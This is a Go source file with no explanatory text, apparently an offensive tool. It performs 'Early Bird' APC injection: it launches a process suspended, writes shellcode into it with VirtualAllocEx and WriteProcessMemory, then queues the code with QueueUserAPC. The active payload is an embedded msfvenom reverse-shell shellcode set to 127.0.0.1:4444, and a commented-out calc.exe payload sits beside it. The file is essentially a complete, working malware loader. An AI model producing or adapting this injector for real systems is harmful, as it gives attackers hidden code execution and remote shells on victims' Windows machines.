package main

import "os"
import "fmt"
import "syscall"
import "unsafe"
import "time"


func VirtualAllocEx(hProcess uintptr, lpAddress uintptr, dwSize uint, flAllocationType uint, flProtect uint) uintptr {
   ret, _, _ := syscall.NewLazyDLL("kernel32.dll").NewProc("VirtualAllocEx").Call(
      uintptr(hProcess),
      uintptr(lpAddress),
      uintptr(dwSize),
      uintptr(flAllocationType),
      uintptr(flProtect),
   )
   return uintptr(ret)
}


func WriteProcessMemory(hProcess uintptr, lpAddress uintptr, lpBuffer uintptr, nSize uintptr) uintptr {
   ret, _, _ := syscall.NewLazyDLL("kernel32.dll").NewProc("WriteProcessMemory").Call(
      uintptr(hProcess),
      uintptr(lpAddress),
      uintptr(lpBuffer),
      uintptr(nSize),
   )
   return uintptr(ret)
}


// QueueUserAPC
func QueueUserAPC(pfnAPC uintptr, hThread uintptr, dwData uintptr) uintptr {
   ret, _, _ := syscall.NewLazyDLL("kernel32.dll").NewProc("QueueUserAPC").Call(
      uintptr(pfnAPC),
      uintptr(hThread),
      uintptr(dwData),
   )
   return uintptr(ret)
}


// ResumeThread
func ResumeThread(hProcess uintptr) uintptr {
   ret, _, _ := syscall.NewLazyDLL("kernel32.dll").NewProc("ResumeThread").Call(
      uintptr(hProcess),
   )
   return uintptr(ret)
}


func CloseHandle(hProcess uintptr) uintptr {
   ret, _, _ := syscall.NewLazyDLL("kernel32.dll").NewProc("CloseHandle").Call(
      uintptr(hProcess),
   )
   return uintptr(ret)
}


// CreateProcess
func CreateProcess(lpApplicationName string, lpCommandLine string, lpProcessAttributes uintptr, lpThreadAttributes uintptr,
   bInheritHandles uintptr, dwCreationFlags int, lpEnvironment uintptr, 
   lpCurrentDirectory string, lpStartupInfo uintptr, lpProcessInformation uintptr) uintptr {
   ret, _, _ := syscall.NewLazyDLL("kernel32.dll").NewProc("CreateProcessA").Call(
      uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(lpApplicationName))),
      uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(lpCommandLine))),
      uintptr(lpProcessAttributes),
      uintptr(lpThreadAttributes),      
      uintptr(bInheritHandles),
      uintptr(dwCreationFlags),
      uintptr(lpEnvironment),
      uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(lpCurrentDirectory))),
      uintptr(lpStartupInfo),
      uintptr(lpProcessInformation),

   )
   return uintptr(ret)
}



func Earlybird_Injection(proc string) int {
   var sI syscall.StartupInfo;
   var pI syscall.ProcessInformation;
   
   argv := syscall.StringToUTF16Ptr(proc)
   err := syscall.CreateProcess(
        nil,
        argv,
        nil,
        nil,
        true,
        4,
        nil,
        nil,
        &sI,
        &pI)

   fmt.Printf("Return: %d\n", err)
   fmt.Printf("[+] Process ID: ", uint32(pI.ProcessId), "\n");
   fmt.Printf("[+] Thread ID: ", uint32(pI.ThreadId), "\n");

   // Payload
   // Payload: msfvenom -p windows/x64/exec CMD=calc.exe -f csharp -b "\x00\x0a\x0d" exitfunc=thread
   // buf := []byte{0x48,0x31,0xc9,0x48,0x81,0xe9,0xdd,0xff,0xff,0xff,0x48,0x8d,0x05,0xef,0xff,0xff,0xff,0x48,0xbb,0x73,0x1f,0x6e,0xa3,0xdb,0x17,0xd6,0x07,0x48,0x31,0x58,0x27,0x48,0x2d,0xf8,0xff,0xff,0xff,0xe2,0xf4,0x8f,0x57,0xed,0x47,0x2b,0xff,0x16,0x07,0x73,0x1f,0x2f,0xf2,0x9a,0x47,0x84,0x56,0x25,0x57,0x5f,0x71,0xbe,0x5f,0x5d,0x55,0x13,0x57,0xe5,0xf1,0xc3,0x5f,0x5d,0x55,0x53,0x57,0xe5,0xd1,0x8b,0x5f,0xd9,0xb0,0x39,0x55,0x23,0x92,0x12,0x5f,0xe7,0xc7,0xdf,0x23,0x0f,0xdf,0xd9,0x3b,0xf6,0x46,0xb2,0xd6,0x63,0xe2,0xda,0xd6,0x34,0xea,0x21,0x5e,0x3f,0xeb,0x50,0x45,0xf6,0x8c,0x31,0x23,0x26,0xa2,0x0b,0x9c,0x56,0x8f,0x73,0x1f,0x6e,0xeb,0x5e,0xd7,0xa2,0x60,0x3b,0x1e,0xbe,0xf3,0x50,0x5f,0xce,0x43,0xf8,0x5f,0x4e,0xea,0xda,0xc7,0x35,0x51,0x3b,0xe0,0xa7,0xe2,0x50,0x23,0x5e,0x4f,0x72,0xc9,0x23,0x92,0x12,0x5f,0xe7,0xc7,0xdf,0x5e,0xaf,0x6a,0xd6,0x56,0xd7,0xc6,0x4b,0xff,0x1b,0x52,0x97,0x14,0x9a,0x23,0x7b,0x5a,0x57,0x72,0xae,0xcf,0x8e,0x43,0xf8,0x5f,0x4a,0xea,0xda,0xc7,0xb0,0x46,0xf8,0x13,0x26,0xe7,0x50,0x57,0xca,0x4e,0x72,0xcf,0x2f,0x28,0xdf,0x9f,0x9e,0x06,0xa3,0x5e,0x36,0xe2,0x83,0x49,0x8f,0x5d,0x32,0x47,0x2f,0xfa,0x9a,0x4d,0x9e,0x84,0x9f,0x3f,0x2f,0xf1,0x24,0xf7,0x8e,0x46,0x2a,0x45,0x26,0x28,0xc9,0xfe,0x81,0xf8,0x8c,0xe0,0x33,0xeb,0x61,0x16,0xd6,0x07,0x73,0x1f,0x6e,0xa3,0xdb,0x5f,0x5b,0x8a,0x72,0x1e,0x6e,0xa3,0x9a,0xad,0xe7,0x8c,0x1c,0x98,0x91,0x76,0x60,0xf7,0xcb,0x2d,0x79,0x5e,0xd4,0x05,0x4e,0xaa,0x4b,0xf8,0xa6,0x57,0xed,0x67,0xf3,0x2b,0xd0,0x7b,0x79,0x9f,0x95,0x43,0xae,0x12,0x6d,0x40,0x60,0x6d,0x01,0xc9,0xdb,0x4e,0x97,0x8e,0xa9,0xe0,0xbb,0xc0,0xba,0x7b,0xb5,0x29,0x16,0x67,0x0b,0xa3,0xdb,0x17,0xd6,0x07}
   // Payload: msfvenom -p windows/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f csharp -b "\x00\x0a\x0d" EXITFUNC=thread
   buf := []byte{0x48,0x31,0xc9,0x48,0x81,0xe9,0xc6,0xff,0xff,0xff,0x48,0x8d,0x05,0xef,0xff,0xff,0xff,0x48,0xbb,0x64,0x28,0x0e,0xc1,0x39,0x5c,0x9f,0xfb,0x48,0x31,0x58,0x27,0x48,0x2d,0xf8,0xff,0xff,0xff,0xe2,0xf4,0x98,0x60,0x8d,0x25,0xc9,0xb4,0x5f,0xfb,0x64,0x28,0x4f,0x90,0x78,0x0c,0xcd,0xaa,0x32,0x60,0x3f,0x13,0x5c,0x14,0x14,0xa9,0x04,0x60,0x85,0x93,0x21,0x14,0x14,0xa9,0x44,0x60,0x85,0xb3,0x69,0x14,0x90,0x4c,0x2e,0x62,0x43,0xf0,0xf0,0x14,0xae,0x3b,0xc8,0x14,0x6f,0xbd,0x3b,0x70,0xbf,0xba,0xa5,0xe1,0x03,0x80,0x38,0x9d,0x7d,0x16,0x36,0x69,0x5f,0x89,0xb2,0x0e,0xbf,0x70,0x26,0x14,0x46,0xc0,0xe9,0xd7,0x1f,0x73,0x64,0x28,0x0e,0x89,0xbc,0x9c,0xeb,0x9c,0x2c,0x29,0xde,0x91,0xb2,0x14,0x87,0xbf,0xef,0x68,0x2e,0x88,0x38,0x8c,0x7c,0xad,0x2c,0xd7,0xc7,0x80,0xb2,0x68,0x17,0xb3,0x65,0xfe,0x43,0xf0,0xf0,0x14,0xae,0x3b,0xc8,0x69,0xcf,0x08,0x34,0x1d,0x9e,0x3a,0x5c,0xc8,0x7b,0x30,0x75,0x5f,0xd3,0xdf,0x6c,0x6d,0x37,0x10,0x4c,0x84,0xc7,0xbf,0xef,0x68,0x2a,0x88,0x38,0x8c,0xf9,0xba,0xef,0x24,0x46,0x85,0xb2,0x1c,0x83,0xb2,0x65,0xf8,0x4f,0x4a,0x3d,0xd4,0xd7,0xfa,0xb4,0x69,0x56,0x80,0x61,0x02,0xc6,0xa1,0x25,0x70,0x4f,0x98,0x78,0x06,0xd7,0x78,0x88,0x08,0x4f,0x93,0xc6,0xbc,0xc7,0xba,0x3d,0x72,0x46,0x4a,0x2b,0xb5,0xc8,0x04,0x9b,0xd7,0x53,0x88,0x87,0x2b,0xec,0xc9,0x3b,0x1b,0x3c,0xc1,0x39,0x1d,0xc9,0xb2,0xed,0xce,0x46,0x40,0xd5,0xfc,0x9e,0xfb,0x64,0x61,0x87,0x24,0x70,0xe0,0x9d,0xfb,0x75,0x74,0x71,0xc1,0x39,0x5d,0xde,0xaf,0x2d,0xa1,0xea,0x8d,0xb0,0xad,0xde,0x41,0x28,0x5f,0x28,0xc6,0xc6,0x89,0xd3,0x72,0x8e,0x40,0x0f,0xc0,0x39,0x5c,0xc6,0xba,0xde,0x01,0x8e,0xaa,0x39,0xa3,0x4a,0xab,0x34,0x65,0x3f,0x08,0x74,0x6d,0x5f,0xb3,0x9b,0xe8,0x46,0x48,0xfb,0x14,0x60,0x3b,0x2c,0xa1,0xcf,0x80,0x83,0xb6,0x90,0x24,0x84,0xd7,0xdb,0x89,0xb0,0x9b,0xf5,0xeb,0x25,0x70,0x42,0x48,0xdb,0x14,0x16,0x02,0x25,0x92,0x97,0x64,0x4d,0x3d,0x60,0x2e,0x2c,0xa9,0xca,0x81,0x3b,0x5c,0x9f,0xb2,0xdc,0x4b,0x63,0xa5,0x39,0x5c,0x9f,0xfb,0x64,0x69,0x5e,0x80,0x69,0x14,0x16,0x19,0x33,0x7f,0x59,0x8c,0x08,0x9c,0xf5,0xf6,0x3d,0x69,0x5e,0x23,0xc5,0x3a,0x58,0xbf,0x40,0x7c,0x0f,0xc0,0x71,0xd1,0xdb,0xdf,0x7c,0xee,0x0e,0xa9,0x71,0xd5,0x79,0xad,0x34,0x69,0x5e,0x80,0x69,0x1d,0xcf,0xb2,0x9b,0xe8,0x4f,0x91,0x70,0xa3,0x57,0xb6,0xed,0xe9,0x42,0x48,0xf8,0x1d,0x25,0x82,0xa8,0x17,0x88,0x3e,0xec,0x14,0xae,0x29,0x2c,0xd7,0xc4,0x4a,0x37,0x1d,0x25,0xf3,0xe3,0x35,0x6e,0x3e,0xec,0xe7,0x7f,0xe6,0x4e,0x22,0x4f,0x7b,0x9f,0xc9,0x22,0x66,0x9b,0xfd,0x46,0x42,0xfd,0x74,0xa3,0xfd,0x18,0x22,0x8e,0x3a,0xd9,0x29,0x9a,0x40,0x23,0x3b,0x7c,0xae,0x53,0x5c,0xc6,0xba,0xed,0xf2,0xf1,0x14,0x39,0x5c,0x9f,0xfb}

   // var baseAddress = auxVirtualAllocEx(pi.hProcess, IntPtr.Zero, (uint)buf.Length, 0x1000 | 0x2000, 0x20);
   // VirtualAllocEx
   var assigned_address uintptr = VirtualAllocEx(uintptr(pI.Process), 0, uint(len(buf)), 0x1000 | 0x2000, 0x20);
   if (assigned_address == 0){
      fmt.Println("[-] VirtualAllocEx API call failed. ");
      os.Exit(-1);
   }
   fmt.Println("[+] Assigned address: \t\t", fmt.Sprintf("0x%x", assigned_address));
      
   // auxWriteProcessMemory(pi.hProcess, baseAddress, buf, buf.Length, out _);
   // WriteProcessMemory
   var res uintptr = WriteProcessMemory(uintptr(pI.Process), assigned_address, uintptr(unsafe.Pointer(&buf[0])), uintptr(len(buf)));
   if (res == 0){
      fmt.Println("[-] WriteProcessMemory API call failed. ");
      os.Exit(-1);
   }
   fmt.Println("[+] WriteProcessMemory response:", res);
   
   // QueueUserAPC
   // auxQueueUserAPC(baseAddress, pi.hThread, 0);
   var queueUserAPC_res uintptr = QueueUserAPC(assigned_address, uintptr(pI.Thread), 0);
   fmt.Println("[+] queueUserAPC_res:\t\t", queueUserAPC_res);

   // auxResumeThread(pi.hThread);
   ResumeThread(uintptr(pI.Thread));

   // CloseHandle
   // CloseHandle(thread_handle);
   // CloseHandle(proc_handle);

   time.Sleep(0 * time.Second)

   return 0;
}


func main() {
   process_name := os.Args[1]
   fmt.Println("[+] Cmd: \t\t\t", process_name);
   Earlybird_Injection(process_name);
}